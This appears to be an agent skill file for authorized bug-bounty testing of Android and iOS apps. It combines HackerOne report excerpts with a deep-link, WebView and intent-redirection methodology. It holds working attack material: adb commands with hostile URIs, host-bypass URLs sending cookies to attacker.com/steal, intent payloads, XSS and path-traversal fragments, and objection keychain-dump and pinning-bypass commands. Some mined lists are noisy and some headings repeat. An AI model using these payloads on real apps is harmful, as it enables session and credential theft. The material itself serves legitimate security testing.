---
name: bbhunt-mobile
description: "Use for APK/IPA analysis, deep links, WebViews, exported components, certificate pinning, local storage, and API secrets in mobile clients. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Mobile App and Client-Side Flaws — unified skill

> **Complete merged skill.** Everything from 2 upstream skills across h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 49 valid HackerOne reports (14 paid / 29%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| admin / privileged-role context | 8 |
| file upload / filename / extension | 7 |
| XML / SOAP / SAML / XXE | 5 |
| two-account / cross-account replay | 4 |
| webhook / OAuth / SAML / integration abuse | 4 |
| cache / CDN / unkeyed header | 3 |
| encoding / double-encode / null byte | 3 |
| unauthenticated / removed-cookie test | 2 |
| HTTP method / verb tampering | 2 |
| fuzzing / wordlist brute force | 2 |
| DOM / HTML source inspection | 2 |
| public source-code / repo review | 2 |
|  HosT/absolute-URL reset poisoning | 1 |
| Content-Type / body-format switch | 1 |
| header injection (Host / X-Forwarded / etc.) | 1 |
| parameter pollution / duplicate keys | 1 |
| search-engine dorking | 1 |
| error message / stack trace probing | 1 |
| parser confusion / normalization | 1 |
| race / concurrency / timing | 1 |
| subdomain / DNS / cert-transparency recon | 1 |

### Parameters observed in writeups

`str4` (2), `str5` (2), `localbundle` (1), `str1` (1), `str2` (1), `str3` (1), `localhttpmethod` (1), `exported` (1), `report_id` (1), `view` (1), `text_query` (1), `sort_type` (1), `sort_direction` (1), `limit` (1), `page` (1)

### Bypass primitives observed

`bypass` (5), `bypassed` (4), `content-type` (1), `trailing dot` (1), `bypassing` (1), `normalization` (1), `normalized` (1), `unicode` (1)

### Impact language observed

`password` (13), `admin` (13), `token` (12), `unauthorized` (3), `credential` (2), `privilege escalation` (1), `remote code execution` (1), `arbitrary code` (1), `secret` (1)

### Case studies — full excerpts (paid and unpaid)

#### [1189162](https://hackerone.com/reports/1189162) — End to end encryption public key is not properly verified on Desktop and Android

Nextcloud · $1500 · medium

Since last time when I reported something on multiple platforms you seems to prefer handling it in 1 spot. I now just do one. Let me know if You want me to fill separate for android as well. This issue does not seem to happen on iOS as there a test string is encrypted and decrypted, in short binding the keypair. So the attack vector results in weird behavior but that seems to be due to random bugs in the end to end encryption implementations (because I also ran into those when just messing around with the end to end encryption). In any case there should be a big error if this happens. 1. userA has an account on serverA 2. End2End encryption is enabled on serverA 3. userA setups device1 and enabled end to end encryption. Stores the nonce. Uploads some data. All is good. 4. Now an attacker obtains access to the server, for sake of argument assume there is an evil Admin. 5. They replace the public key of userA with their own 6. userA now setups device2 7, userA enters the nonce 8. userA uploads more data 9. the evil admin now has access to the uploaded data ## Impact In short it breaks the whole premise of your end to end encryption. An evil admin is able to make the device encrypt to their key. It is even in the RFC: "Client checks if private key belongs to previously downloaded public certificate." Recommendations: 1. the clients should verify that the private key matches with t

#### [519059](https://hackerone.com/reports/519059) — Protected Tweets setting overridden by Android app

X / xAI · $560 · low

**Summary:** Protected Tweets setting overridden by Android app **Description:** The Android app overrides the "Protect your Tweets" setting set from outside the app in some cases when changing other settings. ## Steps To Reproduce: 1. Log in to an account with unprotected tweets on the Android app. 1. Log in to the same account on mobile.twitter.com and turn on protected tweets. 1. Confirm that the account's tweets are protected. 1. In the Android app, go to the Direct Messages tab, click the gear icon and change a setting such as "Receive message requests" or "Show read receipts." 1. The account's tweets are now unprotected. If this does not work, you may have to first explicitly unset the protected tweets setting in the Android app before setting it elsewhere. ## Impact: This can cause a user's tweets to unknowingly become public. It is possible this could be exploited by an attacker asking the user to change their settings but that is less likely to succeed than with the previous bug where only changing the email address was required. ## Impact See above.

#### [1189168](https://hackerone.com/reports/1189168) — Android app does not clear end to end encryption keys

Nextcloud · $100 · low

1. userA on serverA sets up end to end encryption on their android device 2. userA has some end to end encrypted data 3. userA removes their account on serverA from their android device (for whatever reason) 4. attacker (evil admin) obtains the device of userA 5. attacker (evil admin) logs in on the account of userA (reset the pw and just log in) 6. attacker (evil admin) can see and access all encrypted files ## Impact While I believe the impact is minimal since you need to obtain the device of the victim. Once you remove your account all information regarding that account should be removed. * the keys * the mnemonic And certainly when you re-add an account you should be asked to enter your mnemonic!

#### [57764](https://hackerone.com/reports/57764) — ByPassing the email Validation Email on Sign up process in mobile apps

Coinbase · $100 · severity n/a

Hi, According to the design When the new user sign up using mobile apps(android,ios).It will ask for the confirmation of the email.It will send a confirmation mail to mail id and a screen will also appear in the mobile app. The user needs to open the email in the device then the screen will Off and user will successfully login. Bypass: Here simply we can bypass this validation and can successfully login to the application without verifying the validation email which comes to the user.Using this the attacker can create so many spoofed accounts. 1.Sign for new user using email id and password 2.Next screen will appear saying please click on the validation which sent to proceed further 3.Here in the second screen click the back button now you will go to Login screen 4.Now login with the creds which you have given in the registration process 5.Now you will successfully login to the application 6.Here it is not asking for email verification email. Pls follow above procedure to reproduce the issue. Pls respond to remaining bugs which I had reported Thanks, kaleem

#### [1454002](https://hackerone.com/reports/1454002) — Theft of protected files on Android

ownCloud · $50 · low

There is an issue that allows to retrieve any files from protected directory of application - . The issue is caused by exported activity with intent filter that accepts URI of files for upload. Any 3rd-party application could start this activity and upload on server any files such as database file from protected directory in context of owncloud application. Tested on latest stable version of app - 2.19. Version of android - 11. Java PoC: **Mitigation:** There is valid protection for preventing reading files from directory in similar intent-filter . Copy this protection for . ## Impact Potential attacker could steal files from protected directory of application for example files of databases, cache and history of files.

#### [2553026](https://hackerone.com/reports/2553026) — Domain highlighting on External link warning is not working on Chrome & Microsoft Edge browsers on Mobile

HackerOne · no bounty — still valid · low

There have been multiple issues with External Link Warning in the past. Sometimes it's Homograph, sometimes more than 2 slashes in link, sometimes domain highlighting and/or weird markdown. And these all have been fixed. Recently, I've noticed a strange issue with Chrome and Edge browsers on mobile. The highlighting of domains doesn't work at all on External Link Warning interstitial page. None of the links are highlighted. Similar issues were fixed in the past by HackerOne (you can see the bug references below). It seems like these problems have appeared again in the code. ### Steps To Reproduce 1. Log into your account on your mobile from either Latest version of Microsoft Edge browser or Google Chrome. 1. Click on links mentioned below in **Impact** section. 1. Observe that none External link warning interstitial page highlights domain. ## Test cases: Google Chrome, Microsoft Edge & Firefox👇 - Below are the images from Chrome browser along with Chrome's details: {F3363744} {F3363747} {F3363766} - Below are the images from Microsoft Edge browser along with Edge's details: {F3362316} {F3362317} {F3363753} - Below are the images from Firefox Browser along with Firefox's details: {F3362321} {F3362323} {F3363752} ## Impact - Browsers automatically convert decimal to IP address. Upon clicking the link from mobile on Edge or Chrome browser, nothing is highlighted in External link w

#### [328486](https://hackerone.com/reports/328486) — [Zomato Android/iOS] Theft of user session

Eternal · no bounty — still valid · severity n/a

Hi, I'd like to report a bug which allows to theft user data even without installing third-party apps. Activity is exported, and can be accessed by browser. When any WebView (in a client app, or a browser) meets a URL it will automatically launch Zomato app. File File PoC video is very simple: {F277437} Code on local server: All tokens were sent to Google page: {F277440} Third-party apps can also attack your app, PoC from ADB: Hopefully in this case the latest app, but not 2 year old build :) ## Impact 1) Leakage of user tokens to arbitrary sites 2) XSS/Ability of open arbitrary sites in your internal WebView

### Recurring approach patterns from real reports

- 1× i have already tried to logout from my twitter apps including from built in twitter apps for ios and then i already reboot the idevice too
- 1× so when testing i entered the random mobile number and twitter says that verification code sent to the mobile number and asking for the verification code i cant provide the code coz i entered the random number
- 1× hello i have recently found several critical vulnerabilities in odnoklassniki android application which is one of your projects thus i am reporting it here
- 1× you have been tricked u putextra conversation id u putextra mediatopic id u putextra dsc id user photo getactivity sendbroadcast u another vulnerability that i have found is unauthorized intent receipt in this certain case it is unauthorized notification message receipt
- 1× when logging in to an account on the website a user s account gets locked out after tries to prevent an attacker from brute forcing access to the account
- 1× these same restrictions do not apply to the mobile sign in endpoint a post request to which allows an attacker to brute force login of any user s account i have attempted logging into my account times with no restrictions
- 1× as an example i found a list of the most common passwords and added my own password somewhere in the list
- 1× products affected in ios affected is the latest version in android affected in brave latest version steps to reproduce i created a html code which would spoof address bar of brave browser bravespoof html in the attachments
- 1× as we can understand the code contains a form which i have created just to demonstrate a look a like impact where it asks for username and password of any user
- 1× additionally to complete the exploit i used setinterval function to execute the function f continuously after every milliseconds
- 1× i tested the same on many browsers and brave turned out to be affected
- 1× hey summary i ve found an address bar spoofing vulnerability in the latest version of brave for ios
- 1× today i discovered that search engines can access the private users messages otp pins group invites information etc it happens because the host allows search indexing and can leak the auth token to the search engines which also can lead to privilege escalation
- 1× when vieving notifications section on the app i noticed the unsecure get request to the i was surprised when tried to repeat it in the browser it gave me access to my messages
- 1× hello i want to report the vulnerability found since the following activity com application zomatomerchant home homesalt has exported true it can be exploited by another application
- 1× malicious apps can thus crash the nextcloud client by sending following data in intent nc login
- 1× recently i ve noticed a strange issue with chrome and edge browsers on mobile
- 1× reference bugs fixed in past by hackerone multiple issues with markdown and url parsing fake url additional vectors for homograph attack homograph fix bypass

## Corpus-backed method (this class)

1. Acquire the app through authorized channels and document the version/hash.
2. Static analysis: decompile, grep for endpoints, secrets, WebView settings, deep-link schemes, and exported components.
3. Map the API surface to the web skill router — most valid mobile findings are server-side authz issues reachable from the app.
4. Test deep links for unauthorized navigation, intent injection, and WebView URL control.
5. Check local storage and backups for sensitive data at rest, using your own test account.
6. Dynamic testing (Frida/objection) only within authorization and with pinned-cert handling that does not violate program rules.

### Signals

- An in-scope mobile application or downloadable APK/IPA
- Deep-link handlers, WebViews, or exported activities
- Hardcoded endpoints/keys in the binary

### Kill criteria

- Client-only issue with no security consequence for other users or the server.
- App is out of scope or a third-party product.
- Requires a rooted/jailbroken victim device as the only precondition.

### Escalation chains

- Client secret -> API access -> cross-tenant data.
- Deep link -> WebView injection -> local data theft.

### Probes

- Decompile grep for keys/URLs; inspect AndroidManifest exported components; enumerate custom URL schemes.

### Veteran tip

Treat the mobile app as a rich source of API surface and secrets; the highest-impact bugs are usually on the server.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Decompile and inspect exported components and URL schemes.
- Test deep links for auth bypass, open redirect, and token leakage.
- Check local storage, logs, backups, and clipboard for secrets.
- Intercept traffic and test certificate pinning bypass.
- Look for insecure WebViews and JS bridges.

### Deeper checklist

- Decompile and inspect exported activities/services/receivers and URL schemes.
- Test deep links for auth bypass, open redirect, and token leakage.
- Check local storage, logs, backups, and clipboard for secrets.
- Intercept traffic and test certificate pinning bypass.
- Look for insecure WebViews and JS bridges.
- Verify server-side impact, not just client behavior.

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **Pattern 1 — Deep link / custom-scheme hijack → OAuth code or token theft.** Android does NOT verify ownership of custom URI schemes; any installed app can register `myapp://`. A callback `myapp://oauth?code=...` can be intercepted; without PKCE the code is redeemed for a token. **CVE-2026-26123** (Microsoft Authenticator, patched Mar 2026) is the canonical 2026 example. Prefer verified HTTPS App Links (`android:autoVerify`, `assetlinks.json`); Android 12+ stricter web-intent handling reduces but does not remove collision risk (disambiguation dialog).
- **Pattern 2 — WebView host-check bypass (open redirect).** `startsWith("trusted.com")` / `contains("trusted.com")` / `endsWith("wikipedia.org")` are all bypassable: `trusted.com@attacker.com/`, `trusted.com.attacker.com/steal`, `evil-wikipedia.org` (endsWith matches). **GHSL-2026-101 / CVE-2026-65993** (Wikipedia Android `wikipedia://` handler): `evil-wikipedia.org.endsWith("wikipedia.org")` = true → all `centralauth_*` cookies (`centralauth_Session`, `centralauth_Token` ~30-day remember-me, `centralauth_User`) sent to attacker — global SSO across ~800 Wikimedia projects.
- **Pattern 3 — Intent redirection into private components.** Exported activity extracts a nested Intent from extras (or `Intent.parseUri()` on an `intent://` URL) and calls `startActivity()` → launches non-exported activities, ContentProviders, and can grant `FLAG_GRANT_READ_URI_PERMISSION` for file theft. **GHSL-2026-103 / CVE-2026-65994** (Wikipedia `PageActivity` → `SingleWebViewActivity`, JavaScript enabled + cookie-proxying OkHttp client, no domain validation). **EngageSDK (Microsoft, Apr 2026)**: intent redirection in a 3rd-party SDK, 50M+ installs across crypto wallets; fixed in v5.2.1 by making the activity non-exported. **CVE-2025-21079** (Samsung Members, Pwn2Own 2025): WebView 302 → `intent:` URI → `Intent.parseUri` → arbitrary exported activity, one-click via `CATEGORY_BROWSABLE`.
- **Pattern 4 — WebView as second-stage amplifier.** Authenticated WebView carries session cookies, localStorage, JS bridges, file access. Wikipedia's `OkHttpWebViewClient` injected `Access-Control-Allow-Origin: *` on every proxied response (same-origin-policy bypass → authenticated cross-origin reads). Message-handler actions (`{"action":"link"}` etc.) can open arbitrary URLs / `geo:` / `mailto:` intents or autoplay attacker audio.
- **Pattern 5 — Expired whitelist domain takeover.** The whitelist is not bypassed; a whitelisted domain expired and was re-registered by the attacker. Android checks pass, but the app sends auth headers to the attacker. Static analysis cannot detect ownership changes — needs runtime + domain-registration history checks (Oversecured, Apr 2026).
- **iOS equivalents:** custom URL schemes (validate input AND source application — MASTG-BEST-0054/0055), ATS exceptions in `Info.plist`, Keychain items with `kSecAttrAccessibleAlways` / `AfterFirstUnlock` instead of `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`, plaintext plists in the app container, jailbreak-detection and SSL-pinning implementations. MASVS v2.1 / MASTG v2 / MASWE (2026 refactoring) are the current mapping — profiles L1 / L2 / R / P replace the old verification levels.

### Signals and surfaces

### Signal

- Reports: **198** · paid: **67**
- Median bounty **$750** · p90 **$2,940** · max **$10,000** · total **$80,330**
- Median upvotes **18**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 19 | $14,950 | 627 |
| GitHub Security Lab | 6 | $12,200 | 102 |
| X / xAI | 16 | $12,180 | 677 |
| Pornhub | 4 | $8,000 | 85 |
| Slack | 3 | $5,000 | 402 |
| VK.com | 7 | $4,400 | 261 |
| Shopify | 7 | $3,400 | 367 |
| Nextcloud | 26 | $3,275 | 515 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`deeplink` `intent` `webview` `keystore` `shared_prefs` `keychain`

### Techniques, payloads and bypasses

### Payloads & probes

- Deep link -> `app://open?url=https://evil.com` `app://webview?url=javascript:...`
- WebView -> `addJavascriptInterface` abuse
- Backup -> extract shared_prefs / Keychain

### Bypass tricks

- Bypass pinning with Frida/Objection.
- Use dynamic instrumentation for root/jailbreak checks.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552
  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)
- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224
  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `
- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188
  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.
- **1 click Account takeover via deeplink in [com.kayak.android]** — `#1667998` · KAYAK · $0 · ▲173
  > https://fluidattacks.com/blog/account-takeover-kayak/
- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151
  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.
- **[Information Disclosure] Amazon S3 Bucket of Shopify Ping (iOS) have public access of other users image** — `#1021906` · Shopify · $2,900 · ▲135
  > Back to Shopify Store as Customer and inspect the website code, you will find the URL of image ██████████ https://ping-api-production.s3.us-west-2.amazonaws.com/oks██████
- **Changing email address on Twitter for Android unsets "Protect your Tweets"** — `#472013` · X / xAI · $2,940 · ▲119
  > (Add details for how we can reproduce the issue)
- **Possible to steal any protected files on Android** — `#377107` · ownCloud · $750 · ▲115
  > You can bypass the verification using specifying an alternative path: `/data/user/0/com.owncloud.android/`
- **Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** — `#351555` · Reverb.com · $0 · ▲96
  > Also this url https://api.cloudinary.com/v1 1/reverb/usage discloses statistics regarding stored files
- **Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** — `#499348` · X / xAI · $0 · ▲95
  > To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93
  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/
- **Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)** — `#637194` · Shopify · $500 · ▲90
  > `adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'`
- **MetaMask Browser URL and Transaction Origin Spoofing - Metamask wallet Android & Metamask wallet iOS** — `#1751333` · MetaMask · $0 · ▲87
  > @renekroka and @hackerontwowheels from the talented team at [UGWST](https://ugwst.com/) discovered a bug that prevented the MetaMask Mobile browser from correctly updating the domain of the browser tab after a redirect.
- **Grammarly Keyboard for Android <4.1  leaks user input through logs (except for sensitive input fields)** — `#462416` · Superhuman (formerly Grammarly) · $0 · ▲84
  > @homelander identified that Grammarly for Android (on Android <4.1) was leaking user-entered text to device logs.
- **Domain highlighting on External link warning is not working on Chrome & Microsoft Edge browsers on Mobile** — `#2553026` · HackerOne · $0 · ▲82
  > - https://google.com@1234567890/download/safest file: Browsers automatically convert decimal to IP address.
- **Grammarly Keyboard for Android "Authorization Code with PKCE" flow implementation vulnerability that allows account takeover** — `#824931` · Superhuman (formerly Grammarly) · $0 · ▲76
  > @tomtenisse identified a vulnerability in Grammarly Keyboard for Android that allowed malicious application installed on the device to guess the PKCE code verifier value and consequently obtain access to OAuth access token (`grauth` cookie).
- **[Zomato Android/iOS] Theft of user session** — `#328486` · Eternal · $0 · ▲68
  > When any WebView (in a client app, or a browser) meets a URL it will automatically launch Zomato app.
- **Authorization bypass using login by phone option+horizontal escalation possible on Grab Android App** — `#205000` · Grab · $0 · ▲68
  > So, I found the endpoint using android app `https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms` which allow me to bypass OTP code due to lack of rate limiting.
- **Persistant Arbitrary code execution in mattermost android** — `#1115864` · Mattermost · $0 · ▲67
  > On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and to create a modified version of `libyoga.so`
- **URL Scheme Validation Bypass in Shopify Mobile App Allows Javascript Execution** — `#1737358` · Shopify · $0 · ▲65
  > It was found that the com.shopify.mobile app doesn't validate the scheme of the url given as an extra parameter to the com.shopify.mobile.navigation.NavigationActivity which may allow the loading of arbitrary html content (including js code) in the…
- **MetaMask Browser (on Android) does not enforce Content-Security-Policy header** — `#1941767` · MetaMask · $0 · ▲64
  > Notice how our javascript `<script alert('Javascript is executed.')</script ` is blocked by the browser (Chrome in this example):
- **Insufficient session expiration in the **com.shopify.ping** android app** — `#1172205` · Shopify · $0 · ▲63
  > More specifically, after the user provides the required credentials, an access token will be fetched from the server at accounts.shopify.com/oauth/token.
- **Default Nextcloud Server and Android Client leak sharee searches to Nextcloud** — `#1167916` · Nextcloud · $750 · ▲58
  > https://github.com/nextcloud/server/blob/master/apps/files sharing/lib/Controller/ShareesAPIController.php L144
- **Firebase Database Takeover in Zego Sense Android app** — `#1065134` · Zego · $0 · ▲58
  > reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)
- **bypass two-factor authentication in Android apps and web** — `#1747978` · TikTok · $0 · ▲55
  > It was found that this vulnerability required access to the user's email/password or phone number/code associated with the account and multiple bruteforcing attempts to bypass would be needed.
- **Insecure Storage and Overly Permissive  API Keys in Android App** — `#753868` · Zenly · $750 · ▲52
  > You can also create server-side filters to help prevent this thing from happening.
- **[Zomato for Business Android] Vulnerability in exported activity WebView** — `#537670` · Eternal · $0 · ▲52
  > Since the following activity `com.application.zomatomerchant.home.HomeSalt` has `exported="true"` it can be exploited by another application.
- **[Android] Directory traversal leading to disclosure of auth tokens** — `#1378889` · Slack · $3,500 · ▲50
  > In order to take advantage of this vulnerability, attackers needed to be in a workspace with the user and to induce a user to click on a file uploaded to Slack exceeding 1MB (files smaller than 1MB are not downloaded to the device and therefore do not present…
- **[Android] XSS via start ContentActivity** — `#189793` · Quora · $0 · ▲50
  > Using intent extra parameter `html` we can pass javascript, which will be executed in the context of www.quora.com.
- **iOS Brave Playlist "Open in Private Tab" bypasses FaceID requirement for Private Tabs** — `#3693295` · Brave Software · $0 · ▲49
  > Adding/Opening a song in your Brave playlist and holding for the option of "Open in new Private Tab" bypasses FaceID/Passcode Requirement for Private Tabs.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 2× | `www.pscp.tv/<user-id>/follow` |
| 2× | `<meta>` |
| 2× | `../../../lib-1/libjnigraphics.so` |
| 1× | `) could lead that an arbtrary URL was opened in a built-in browser in activity` |
| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |
| 1× | `and be the connected to the Grab account on Android app) - or you can use my test number` |
| 1× | `<script>alert('Javascript is executed.')</script>` |
| 1× | `alert()` |
| 1× | `DELETE /api/v1/logout HTTP/1.1 / authorization: Bearer atkn_********************************** / Host: accounts.shopify.com / Connection: cl` |
| 1× | `GET /oauth/userinfo HTTP/1.1 / Accept-Encoding: gzip, deflate / authorization: Bearer *************** / ....` |
| 1× | `adb shell / am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123` |
| 1× | `am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipbo` |
| 1× | `Intent i = new Intent(); / i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity")); / i.putExtra` |
| 1× | `HTTP/1.1 400 Bad Request / Content-Encoding: gzip / Content-Type: application/json; charset=utf-8 / Date: Tue, 31 Jan 2017 17:45:43 GMT / X-` |
| 1× | `ImageList.fetchImageInfo(..)` |
| 1× | `<script> / location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--" / </script>` |
| 1× | `<body> / <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })()` |
| 1× | `../../../../../../../data/data/jp.naver.line.android/files/something` |
| 1× | `getLastPathSegment()` |
| 1× | `file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Android: launch an exported activity with a hostile URI (adb, second device/app context)
adb shell am start -n org.wikipedia/org.wikipedia.page.PageActivity \
  -a android.intent.action.VIEW \
  -d 'thankyou.evil-wikipedia.org/wiki/PoC?order_id=1&wmf_campaign=Android&amount=5&currency=USD'
adb shell am start -a android.intent.action.VIEW \
  -d 'wikipedia://evil-wikipedia.org/wiki/Main_Page'     # endsWith host-bypass variant

# WebView host-check bypass payloads to try against any deep-link router
https://trusted.com@attacker.com/steal
https://trusted.com.attacker.com/steal
https://evil-trusted.com/                    # for contains/endsWith checks
intent:#Intent;package=com.target.app;component=com.target.app/.InternalActivity;S.extra=evil;end

# Static triage
aapt dump xmltree target.apk AndroidManifest.xml | grep -iE 'exported|intent-filter|autoVerify|scheme'
jadx or apktool: grep for startActivity(, Intent.parseUri, setJavaScriptEnabled(true),
  getCookies/loadForRequest, shouldOverrideUrlLoading, startsWith/endsWith host checks

# iOS runtime (Frida/objection; non-jailbroken path = repackage with Frida Gadget via Sideloadly)
objection -g <bundle-id> explore
ios keychain dump --json keychain_output.json    # look for authToken, JWT, pincode + accessibility class
ios sslpinning disable                           # then proxy through Burp
ios jailbreak disable
env                                              # bundle/data dirs
file download /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/<id>.plist
# class-dump -H <binary> -o headers/ ; strings <binary> | grep -iE 'key|secret|token|password|api'
```

Chains to test in order: **custom scheme hijack → captured OAuth code → token (PKCE absent)**; **deep link open-redirect → authenticated WebView → cookie/token exfil**; **exported activity → nested Intent → non-exported ContentProvider → file read**.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Prove real impact on a second controlled account or a safe callback** (existing reporting bar). For cookie/token theft, show the attacker-controlled server receiving a *live* `centralauth_*`-equivalent session token, then demonstrate that token authenticating to a second account/session. A 302 or a WebView loading your URL is not theft.
- **Attacker model matters — grade it honestly:** a local malicious-app prerequisite (Wikipedia GHSL cases, EngageSDK) is High/Critical for affected users but is NOT a remote one-click internet bug; Pwn2Own-style `CATEGORY_BROWSABLE` WebView→intent chains ARE remote one-click and grade higher. State the precondition explicitly in the finding.
- **Static-analysis blind spots:** host-string checks can look correct while the whitelisted domain has expired (Pattern 5), and SDK code may be the vulnerable layer (EngageSDK) rather than first-party code. Always confirm at runtime with a controlled domain.
- **WebView context is the amplifier:** require evidence that the loaded page actually had cookies/localStorage/JS bridge access (e.g., `setCookies()`/`loadForRequest()` call, `javaScriptEnabled=true`), not just "WebView navigated to attacker.com". An `Access-Control-Allow-Origin: *` injection must be shown enabling a cross-origin authenticated read.
- **iOS caveats:** keychain `kSecAttrAccessibleAlways` is a real finding only if the item is a secret; `env`/plist dumps on a simulator do not prove file-protection or Secure Enclave behavior. Check the actual accessibility class (`aku` = WhenUnlockedThisDeviceOnly is the safe value; `ak`, `dk`, `ck` are violations) and note jailbreak/simulator limitations in the report. A clean advisory/OSV lookup is not proof of absence.
- **MASVS mapping:** Android findings → MASVS-PLATFORM / MASTG-KNOW-0019; iOS → MASVS-STORAGE / NETWORK / PLATFORM; cite MASWE weakness IDs from the 2026 mapping where possible. Severity: token theft / WebView takeover = Critical; intent redirection to private data = High; missing `autoVerify`/scheme collision without a sensitive callback = Medium.

### Escalation and related chains

### Escalation chains

- Deeplink -> token theft.
- WebView bridge -> RCE.

### Tools and wordlists

### Tools

`apktool` · `jadx` · `Frida` · `objection` · `MobSF`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_mobile.txt` | 77 |
| `~/.local/share/hackerone-reports/wordlists/params_mobile.txt` | 35 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_mobile.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_mobile.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Nuclei only sees the backend. Decompile the app and test deep links, WebViews, and local storage manually.

```sh
nuclei -u https://target -tags android,ios \
       -severity low,medium,high,critical -rl 40 -o nuclei_mobile.txt
nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
       -rl 40 -o nuclei_mobile_misconfiguration.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class mobile --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class mobile
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class mobile
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class mobile --min-bounty 1000
```

### Related

- `hackerone-auth-bypass` (989 reports)
- `hackerone-crypto-and-secrets` (562 reports)
- `hackerone-xss` (2,569 reports)

### Related

- `auth-bypass` (989 reports)
- `crypto-and-secrets` (562 reports)
- `xss` (2,569 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://securitylab.github.com/advisories/GHSL-2026-103_apps-android-wikipedia/
2. https://securitylab.github.com/advisories/GHSL-2026-101_apps-android-wikipedia
3. https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks
4. https://developer.android.com/privacy-and-security/risks/intent-redirection
5. https://www.microsoft.com/en-us/security/blog/2026/04/09/intent-redirection-vulnerability-third-party-sdk-android
6. https://oversecured.com/blog/android-deep-link-vulnerabilities
7. https://breachauthority.com/posts/deep-link-and-intent-hijacking-in-android-applications
8. https://djini.ai/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/
9. https://support.google.com/faqs/answer/9267555
10. https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019
11. https://mas.owasp.org/MASTG/0x06b-iOS-Security-Testing
12. https://mas.owasp.org/MASVS/03-Using_the_MASVS
13. https://owasp.github.io/DevSecOpsGuideline/2-Process/2-4-Test/2-4-3-Mobile-Application-Security-Test
14. https://payloadplayground.com/blog/ios-security-testing-guide
15. https://www.redfoxsec.com/blog/ios-pen-testing-with-objection-a-complete-guide-for-security-professionals
16. https://codezup.com/ios-app-security-auditing-guide

### Additional notes

### Parameters observed

